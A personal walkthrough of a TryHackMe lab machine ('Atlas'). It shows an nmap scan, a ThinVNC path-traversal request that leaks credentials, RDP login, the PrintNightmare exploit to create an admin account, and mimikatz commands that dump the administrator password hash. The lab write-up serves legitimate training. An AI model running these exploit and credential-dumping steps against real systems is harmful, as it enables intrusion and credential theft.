
---
#### Nmap

```
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-12-25T05:01:36+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=GAIA
| Not valid before: 2023-12-24T04:31:41
|_Not valid after:  2024-06-24T04:31:41
8080/tcp open  http-proxy
| http-auth: 
| HTTP/1.1 401 Access Denied\x0D
|_  Digest opaque=FHb3WOIfdS8CXuoR869aVL62VVwWh1SKLf qop=auth realm=ThinVNC nonce=8M5ls6Yc5kBI40wCphzmQA==
|_http-title: 401 Access Denied
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.<P></BODY></HTML>
|   GetRequest: 
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="dgDYqKYc5kCI10wCphzmQA==", opaque="luBY9AEKC15G8Ja9loCqkVgMZoNXVI44b2"
|_    <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL requires authorization.<P></BODY></HTML>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.82 seconds
```


---

#### HTTP

- use  the THM room guided section
- identified port 8080 is running `WWW-Authenticate: Digest realm="ThinVNC"` using nmap
- Found an exploit for it - https://www.exploit-db.com/exploits/47519
- In order to exploit this, we had to
    - capture request in burp
    - change path variable to /xyz/../../ThinVnc.ini

![[Pasted image 20231225124752.png]]
    - We get a set of credentails

```
User=Atlas
Password=H0ldUpTheHe@vens
```

- enter machine IP as machine input and we the the desktop on browser using vnc
- used guided room to identify we can continue with rdp

---

#### Foothold

- Logging in with rdp
```
xfreerdp /v:10.10.25.75 /u:Atlas /p:H0ldUpTheHe@vens
```

- guided room suggested to use a different rdp command for file sharing with windows, very usefull
```
xfreerdp /v:10.10.25.75 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp&
```

- cloned this repository in my `/tmp` file  [repository](https://github.com/calebstewart/CVE-2021-1675) 
```
We can import it using:  
`. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1`

_Make sure to include the dot at the start!_

This uses dot-syntax to import any functions exposed by the script. We are using `\\tsclient\share` to reference the share that we created. 

This allows us to view (and thus import) files that are stored in the /tmp folder of our own attacking machine!
```

- run the exploit
```
PS C:\Users\Atlas> Invoke-Nightmare
```

---

We could take the simple option of right-clicking on PowerShell or cmd.exe and choosing to "Run as Administrator", but that's no fun. Instead, let's use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.

The command is as follows:  
```
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```

---

- we can login into this using above mentioned pass and get admin shell
```
C:\Windows\system32>whoami
gaia\adm1n
```

or
```
  
PS C:\Windows\system32> whoami /groups
```

---

- The classic thing to do here would be to try to dump the password hashes from the machine.`

- The most commonly used tool to dump password hashes on Windows is [Mimikatz](https://github.com/gentilkiwi/mimikatz) by the legendary [Benjamin Delpy](https://twitter.com/gentilkiwi/). The go-to tool for Windows post-exploitation: few tools are more iconic or more well-known than Mimikatz.
--- 

- followed the guided step and run this in target system
```
PS C:\Windows\system32> \\tsclient\share\mimi.exe
```

- Added this to my notes [[1. mimikatz - windows password dump]]

- Running these commands in mimikatz shell

```
privilege::debug

token::elevate

lsadump::sam
```

- we get the administrator's hash `c16444961f67af7eea7e420b65c8c3eb`



